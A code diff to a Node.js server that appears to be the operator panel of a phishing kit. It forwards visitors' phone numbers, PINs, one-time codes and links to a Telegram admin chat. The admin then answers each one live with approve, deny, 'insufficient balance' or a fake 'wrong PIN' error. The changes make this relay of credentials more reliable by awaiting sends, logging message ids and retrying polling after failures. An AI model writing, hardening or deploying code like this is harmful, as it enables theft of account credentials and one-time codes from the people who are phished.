@@ -89,7 +89,7 @@ setInterval(() => {
   }
 }, 10 * 60 * 1000);
 
-function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
+async function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
   if (!api || !ADMIN_CHAT_ID) return;
 
   const telegramPhone = formatTelegramPhone(phone);
@@ -126,7 +126,7 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
         ];
 
   try {
-    return api.sendMessage({
+    const sent = await api.sendMessage({
       chat_id: ADMIN_CHAT_ID,
       text,
       parse_mode: 'Markdown',
@@ -134,6 +134,8 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
         inline_keyboard: [buttonRow],
       },
     });
+    console.log(`Telegram notification sent for request ${id} (message ${sent.message_id}).`);
+    return sent;
   } catch (err) {
     console.error('Failed to send Telegram notification:', err.message);
     return null;
@@ -518,75 +520,78 @@ const LABEL_BY_ACTION = {
 };
 
 async function processTelegramCallbacks() {
-  try {
-    await api.deleteWebhook({ drop_pending_updates: false });
-    console.log('Telegram API ready. Listening for admin approval actions.');
+  while (true) {
+    try {
+      await api.deleteWebhook({ drop_pending_updates: false });
+      console.log('Telegram API ready. Listening for admin approval actions.');
 
-    for await (const update of longPoll(api, { timeout: 30 })) {
-      const callback = update.callback_query;
-      if (!callback) continue;
+      for await (const update of longPoll(api, { timeout: 30 })) {
+        const callback = update.callback_query;
+        if (!callback) continue;
 
-      const [action, id] = String(callback.data || '').split(':');
-      const chatId = callback.message?.chat?.id;
-      const messageId = callback.message?.message_id;
+        const [action, id] = String(callback.data || '').split(':');
+        const chatId = callback.message?.chat?.id;
+        const messageId = callback.message?.message_id;
 
-      if (String(chatId) !== String(ADMIN_CHAT_ID)) {
-        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Not authorized.' });
-        continue;
-      }
+        if (String(chatId) !== String(ADMIN_CHAT_ID)) {
+          await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Not authorized.' });
+          continue;
+        }
 
-      const request = requests.get(id);
-      if (!LABEL_BY_ACTION[action] || !id || !request) {
-        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'This request is no longer available.' });
-        continue;
-      }
+        const request = requests.get(id);
+        if (!LABEL_BY_ACTION[action] || !id || !request) {
+          await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'This request is no longer available.' });
+          continue;
+        }
 
-      const statusByAction = {
-        approve: request.step === 'otp' ? 'completed' : request.step === 'link' ? 'otp_pending' : 'phone_pin_verified',
-        deny: request.step === 'otp' ? 'wrong_otp' : request.step === 'link' ? 'wrong_link' : 'wrong_pin',
-        insufficient: 'insufficient_balance',
-        demo_error: 'wrong_pin',
-      };
-      const status = statusByAction[action];
-      if (!status) {
-        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Unknown action.' });
-        continue;
-      }
+        const statusByAction = {
+          approve: request.step === 'otp' ? 'completed' : request.step === 'link' ? 'otp_pending' : 'phone_pin_verified',
+          deny: request.step === 'otp' ? 'wrong_otp' : request.step === 'link' ? 'wrong_link' : 'wrong_pin',
+          insufficient: 'insufficient_balance',
+          demo_error: 'wrong_pin',
+        };
+        const status = statusByAction[action];
+        if (!status) {
+          await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Unknown action.' });
+          continue;
+        }
 
-      updateRequestStatus(id, status);
-      await api.answerCallbackQuery({ callback_query_id: callback.id, text: LABEL_BY_ACTION[action] });
-      if (messageId) {
-        const statusLabel = {
-          phone_pin_verified: 'APPROVED',
-          completed: 'APPROVED',
-          wrong_pin: 'WRONG PIN',
-          wrong_otp: 'WRONG CODE',
-          wrong_link: 'WRONG LINK',
-          insufficient_balance: 'INSUFFICIENT BALANCE',
-        }[status] || status.toUpperCase();
-        const statusPrefix = statusLabel === 'APPROVED' ? '✅' : statusLabel.startsWith('INSUFFICIENT') ? '⚠️' : '❌';
-        const originalText = callback.message?.text || '';
-        const updatedText = `${originalText}\n\n${statusPrefix} Status: ${statusLabel}`;
+        updateRequestStatus(id, status);
+        await api.answerCallbackQuery({ callback_query_id: callback.id, text: LABEL_BY_ACTION[action] });
+        if (messageId) {
+          const statusLabel = {
+            phone_pin_verified: 'APPROVED',
+            completed: 'APPROVED',
+            wrong_pin: 'WRONG PIN',
+            wrong_otp: 'WRONG CODE',
+            wrong_link: 'WRONG LINK',
+            insufficient_balance: 'INSUFFICIENT BALANCE',
+          }[status] || status.toUpperCase();
+          const statusPrefix = statusLabel === 'APPROVED' ? '✅' : statusLabel.startsWith('INSUFFICIENT') ? '⚠️' : '❌';
+          const originalText = callback.message?.text || '';
+          const updatedText = `${originalText}\n\n${statusPrefix} Status: ${statusLabel}`;
 
-        try {
-          await api.editMessageText({
-            chat_id: chatId,
-            message_id: messageId,
-            text: updatedText,
-            reply_markup: { inline_keyboard: [] },
-          });
-        } catch (err) {
-          console.error('Failed to update Telegram approval message:', err.message);
-          await api.editMessageReplyMarkup({
-            chat_id: chatId,
-            message_id: messageId,
-            reply_markup: { inline_keyboard: [] },
-          });
+          try {
+            await api.editMessageText({
+              chat_id: chatId,
+              message_id: messageId,
+              text: updatedText,
+              reply_markup: { inline_keyboard: [] },
+            });
+          } catch (err) {
+            console.error('Failed to update Telegram approval message:', err.message);
+            await api.editMessageReplyMarkup({
+              chat_id: chatId,
+              message_id: messageId,
+              reply_markup: { inline_keyboard: [] },
+            });
+          }
         }
       }
+    } catch (err) {
+      console.error(`Telegram callback polling failed: ${err.message}. Retrying in 3 seconds.`);
+      await new Promise(resolve => setTimeout(resolve, 3000));
     }
-  } catch (err) {
-    console.error('Telegram callback polling failed:', err.message);
   }
 }
 
